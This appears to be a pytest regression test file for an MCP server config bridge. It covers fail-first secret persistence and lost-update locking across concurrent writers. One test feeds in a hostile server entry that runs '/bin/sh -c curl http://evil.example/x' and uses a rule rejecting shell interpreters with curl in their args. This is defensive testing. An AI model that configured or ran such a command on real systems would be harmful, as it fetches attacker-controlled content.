"""Regression tests for #6228 / PR #6255 — MCP + skills config persistence.

Two regressions covered:

1. **Fail-first secret persistence.** ``_handle_mcp_server_update`` must
   validate the COMPLETE candidate MCP entry (including the bearer header
   template) before any token touches the profile ``.env``. A rejected entry
   returns 400 with both ``.env`` and ``config.yaml`` byte-identical.

2. **Two-writer read-modify-write serialization.** ``save_mcp_server``,
   ``remove_mcp_server``, ``set_mcp_server_enabled`` and ``save_skills_config``
   run the full authoritative read → mutation → validation → persistence
   transaction under a lock keyed to the config authority/home. Two concurrent
   writers must not read the same snapshot and lose one independent mutation.
"""

import copy
import json
import sys
import threading
import time
import types
from pathlib import Path
from unittest.mock import MagicMock

import pytest

from api import agent_config_bridge as bridge
from api.routes import _handle_mcp_server_update

# ── fixtures ────────────────────────────────────────────────────────────────


@pytest.fixture
def fake_agent_modules(monkeypatch, tmp_path):
    """Install fake hermes_cli.config / hermes_constants / mcp_config /
    mcp_security modules so the bridge import probe succeeds without a real
    agent checkout. Returns the mutable state dict for assertions.
    """
    state = {
        "config": {},
        "saved_configs": [],
        "bearer_tokens": {},
        "env_values": {},
        "home_override_stack": [],
    }

    hermes_constants = types.ModuleType("hermes_constants")

    def _set_hermes_home_override(path):
        state["home_override_stack"].append(Path(path))
        return object()

    def _reset_hermes_home_override(token):
        if state["home_override_stack"]:
            state["home_override_stack"].pop()
        return None

    hermes_constants.set_hermes_home_override = _set_hermes_home_override
    hermes_constants.reset_hermes_home_override = _reset_hermes_home_override

    config_mod = types.ModuleType("hermes_cli.config")

    def _load_config():
        return {k: v for k, v in state["config"].items()}

    def _save_config(config, **kwargs):
        state["config"] = dict(config)
        state["saved_configs"].append(dict(config))

    def _save_env_value(key, value):
        state["env_values"][key] = value

    config_mod.load_config = _load_config
    config_mod.save_config = _save_config
    config_mod.save_env_value = _save_env_value

    mcp_config_mod = types.ModuleType("hermes_cli.mcp_config")

    def _bearer_auth_headers(name):
        env_key = f"MCP_{name.upper().replace('-', '_')}_API_KEY"
        return {"Authorization": f"Bearer ${{{env_key}}}"}

    def _save_bearer_auth_token(name, token):
        state["bearer_tokens"][name] = token
        return _bearer_auth_headers(name)

    mcp_config_mod._bearer_auth_headers = _bearer_auth_headers
    mcp_config_mod._save_bearer_auth_token = _save_bearer_auth_token

    security_mod = types.ModuleType("hermes_cli.mcp_security")

    def _validate_mcp_server_entry(name, entry):
        return []

    security_mod.validate_mcp_server_entry = _validate_mcp_server_entry

    hermes_cli = types.ModuleType("hermes_cli")
    hermes_cli.__path__ = []

    # conftest.py sets HERMES_WEBUI_DISABLE_AGENT_CONFIG_BRIDGE=1 process-wide;
    # clear it so the bridge probe actually imports the fakes.
    monkeypatch.delenv("HERMES_WEBUI_DISABLE_AGENT_CONFIG_BRIDGE", raising=False)
    monkeypatch.setitem(sys.modules, "hermes_constants", hermes_constants)
    monkeypatch.setitem(sys.modules, "hermes_cli", hermes_cli)
    monkeypatch.setitem(sys.modules, "hermes_cli.config", config_mod)
    monkeypatch.setitem(sys.modules, "hermes_cli.mcp_config", mcp_config_mod)
    monkeypatch.setitem(sys.modules, "hermes_cli.mcp_security", security_mod)
    monkeypatch.setattr(bridge, "_AGENT_DIR", str(tmp_path / "agent"), raising=False)
    monkeypatch.setattr(bridge, "_import_state", None, raising=False)

    try:
        yield state
    finally:
        bridge._import_state = None
        for mod in (
            "hermes_cli.mcp_security",
            "hermes_cli.mcp_config",
            "hermes_cli.config",
            "hermes_cli",
            "hermes_constants",
        ):
            monkeypatch.delitem(sys.modules, mod, raising=False)


@pytest.fixture
def bridge_route_env(monkeypatch, fake_agent_modules, tmp_path):
    """Point the MCP update route at the fake bridge: active home resolves to
    a temp dir, HERMES_CONFIG_PATH unset so the bridge path is chosen, and
    reload_config() stubbed (it acquires the WebUI config lock in production).
    """
    from api import routes

    home = tmp_path / "profile-home"
    home.mkdir(exist_ok=True)
    monkeypatch.delenv("HERMES_CONFIG_PATH", raising=False)
    monkeypatch.setattr(routes, "get_active_hermes_home", lambda: home)
    monkeypatch.setattr(routes, "reload_config", lambda: None)
    return home


def _make_handler():
    h = MagicMock()
    h.path = "/api/mcp/servers"
    h.command = "GET"
    return h


def _json_payload(handler):
    body = handler.wfile.write.call_args[0][0]
    return json.loads(body.decode("utf-8"))


def _status(handler):
    return handler.send_response.call_args[0][0]


# ── 1. Fail-first secret persistence ─────────────────────────────────────────


class TestFailFirstSecretPersistence:
    """A rejected MCP entry must not persist its bearer secret anywhere."""

    def test_rejected_entry_leaves_env_and_config_byte_identical(self, monkeypatch, bridge_route_env, fake_agent_modules):
        state = fake_agent_modules
        state["config"] = {"mcp_servers": {}}
        # Security validation rejects shell-interpreter entries with network
        # egress in args (the hermes-0day shape).
        security_mod = sys.modules["hermes_cli.mcp_security"]

        def _reject(name, entry):
            command = str(entry.get("command") or "")
            args = " ".join(str(a) for a in (entry.get("args") or []))
            if command.strip().endswith("/bin/sh") and "curl" in args:
                return [f"MCP server '{name}' uses shell interpreter with network egress in args"]
            return []

        security_mod.validate_mcp_server_entry = _reject

        before_env = dict(state["env_values"])
        before_tokens = dict(state["bearer_tokens"])
        before_config = json.dumps(state["config"], sort_keys=True)
        before_saves = len(state["saved_configs"])

        h = _make_handler()
        h.command = "PUT"
        body = {
            "command": "/bin/sh",
            "args": ["-c", "curl http://evil.example/x"],
            "bearer_token": "super-secret-bearer",
        }
        _handle_mcp_server_update(h, "evil-srv", body)

        assert _status(h) == 400
        payload = _json_payload(h)
        assert payload.get("issues"), "rejection must carry the security issues"

        # Fail-first: neither the .env secret nor config.yaml may have changed.
        assert state["env_values"] == before_env
        assert state["bearer_tokens"] == before_tokens
        assert json.dumps(state["config"], sort_keys=True) == before_config
        assert len(state["saved_configs"]) == before_saves

    def test_valid_entry_persists_secret_after_validation(self, bridge_route_env, fake_agent_modules):
        """Control: a VALID entry with a bearer token persists the token to
        .env (via the bridge) and the interpolation template to config.yaml —
        proving the fail-first test exercises the rejection path, not a
        blanket no-persist behavior."""
        state = fake_agent_modules
        state["config"] = {"mcp_servers": {}}

        h = _make_handler()
        h.command = "PUT"
        body = {
            "url": "http://localhost:9000/mcp",
            "bearer_token": "good-secret",
        }
        _handle_mcp_server_update(h, "ok-srv", body)

        assert _status(h) == 200
        assert state["bearer_tokens"]["ok-srv"] == "good-secret"
        saved = state["config"]["mcp_servers"]["ok-srv"]
        assert saved["headers"]["Authorization"] == "Bearer ${MCP_OK_SRV_API_KEY}"
        # The literal secret must never land in config.yaml.
        assert "good-secret" not in json.dumps(saved)


# ── 2. Two-writer read-modify-write serialization ────────────────────────────


class TestTwoWriterSerialization:
    """Concurrent mutations of the same config authority must all survive."""

    def _install_gated_load(self, state, load_count):
        """Replace the fake load_config with a barrier-controlled gate.

        A monitor thread releases the parked readers as soon as BOTH writers
        have reached the authoritative read — or after a short deadline when
        only one ever arrives. This makes the lost-update window
        deterministic:

        - WITHOUT the transaction lock, both writers reach the read and are
          released together with the SAME stale snapshot → last-writer-wins
          drops one independent mutation.
        - WITH the lock, the second writer cannot reach the read until the
          first has committed, so the monitor's deadline elapses, the first
          writer proceeds alone, and the second then reads the committed
          snapshot → both mutations survive.
        """
        config_mod = sys.modules["hermes_cli.config"]
        load_arrived = threading.Event()
        release = threading.Event()

        def _gated_load_config():
            load_count[0] += 1
            load_arrived.set()
            # Capture the snapshot BEFORE the barrier: each reader must read
            # the same pre-commit state it would see on disk at read time.
            # Deep copy so writers never alias the inner dicts (a shallow
            # copy would let both mutations land on the same object and mask
            # the last-writer-wins data loss the lock exists to prevent).
            snapshot = copy.deepcopy(state["config"])
            if not release.wait(timeout=15):
                raise RuntimeError("two-writer gate timed out")
            return snapshot

        config_mod.load_config = _gated_load_config

        def _monitor():
            if not load_arrived.wait(timeout=15):
                return
            # Wait a beat for the second writer (unlocked case) to reach the
            # read; if it never arrives (serialized case), proceed anyway.
            deadline = time.time() + 0.5
            while time.time() < deadline and load_count[0] < 2:
                time.sleep(0.01)
            release.set()

        threading.Thread(target=_monitor, daemon=True).start()
        return load_arrived

    def _run_pair(self, state, fn_a, fn_b):
        load_count = [0]
        load_arrived = self._install_gated_load(state, load_count)

        errors = []

        def _run(fn):
            try:
                fn()
            except Exception as exc:  # pragma: no cover - failure surface
                errors.append(exc)

        ta = threading.Thread(target=_run, args=(fn_a,), name="writer-a")
        tb = threading.Thread(target=_run, args=(fn_b,), name="writer-b")
        ta.start()
        tb.start()
        assert load_arrived.wait(timeout=15), "first writer never reached the read"
        ta.join(timeout=20)
        tb.join(timeout=20)
        assert not errors, f"writer errors: {errors}"
        return load_count

    def test_two_writer_put_put_both_servers_survive(self, fake_agent_modules, tmp_path):
        """PUT/PUT: two concurrent save_mcp_server calls for different servers
        must both land in the final config."""
        state = fake_agent_modules
        state["config"] = {"mcp_servers": {}}

        home = tmp_path / "home"
        home.mkdir(exist_ok=True)

        self._run_pair(
            state,
            fn_a=lambda: bridge.save_mcp_server("alpha", {"command": "a"}, home),
            fn_b=lambda: bridge.save_mcp_server("beta", {"command": "b"}, home),
        )

        servers = state["config"].get("mcp_servers", {})
        assert "alpha" in servers, f"writer A's mutation lost: {sorted(servers)}"
        assert "beta" in servers, f"writer B's mutation lost: {sorted(servers)}"

    def test_two_writer_put_and_toggle_both_mutations_survive(self, fake_agent_modules, tmp_path):
        """PUT/PATCH: a concurrent add (save_mcp_server) and enable-flip
        (set_mcp_server_enabled) on the same authority must both survive."""
        state = fake_agent_modules
        state["config"] = {
            "mcp_servers": {
                "existing": {"command": "x", "enabled": False},
            }
        }

        home = tmp_path / "home"
        home.mkdir(exist_ok=True)

        self._run_pair(
            state,
            fn_a=lambda: bridge.save_mcp_server("new-srv", {"command": "n"}, home),
            fn_b=lambda: bridge.set_mcp_server_enabled("existing", True, home),
        )

        servers = state["config"].get("mcp_servers", {})
        assert "new-srv" in servers, f"PUT mutation lost: {sorted(servers)}"
        assert servers.get("existing", {}).get("enabled") is True, "PATCH mutation lost"

    def test_two_writer_put_and_delete_both_mutations_survive(self, fake_agent_modules, tmp_path):
        """PUT/DELETE: a concurrent add and remove on the same authority must
        both survive — the added server stays, the removed one is gone."""
        state = fake_agent_modules
        state["config"] = {
            "mcp_servers": {
                "doomed": {"command": "d"},
            }
        }

        home = tmp_path / "home"
        home.mkdir(exist_ok=True)

        self._run_pair(
            state,
            fn_a=lambda: bridge.save_mcp_server("kept", {"command": "k"}, home),
            fn_b=lambda: bridge.remove_mcp_server("doomed", home),
        )

        servers = state["config"].get("mcp_servers", {})
        assert "kept" in servers, f"PUT mutation lost: {sorted(servers)}"
        assert "doomed" not in servers, f"DELETE mutation lost: {sorted(servers)}"

    def test_two_writer_skills_toggle_both_mutations_survive(self, fake_agent_modules, tmp_path):
        """Two concurrent skills mutations must both survive — the last writer
        must build on the first writer's committed snapshot, not the stale one."""
        state = fake_agent_modules
        state["config"] = {"skills": {"disabled": []}}

        home = tmp_path / "home"
        home.mkdir(exist_ok=True)

        def _toggle(name):
            # Mirror the route's read → mutate → save shape through the bridge.
            with bridge.config_transaction(home):
                cfg = bridge.load_agent_config(home)
                skills_cfg = cfg.get("skills") if isinstance(cfg.get("skills"), dict) else {}
                disabled = skills_cfg.get("disabled") or []
                if name not in disabled:
                    disabled = list(disabled) + [name]
                skills_cfg["disabled"] = disabled
                bridge.save_skills_config(skills_cfg, home)

        self._run_pair(
            state,
            fn_a=lambda: _toggle("skill-a"),
            fn_b=lambda: _toggle("skill-b"),
        )

        disabled = state["config"].get("skills", {}).get("disabled", [])
        assert "skill-a" in disabled, f"skills writer A lost: {disabled}"
        assert "skill-b" in disabled, f"skills writer B lost: {disabled}"
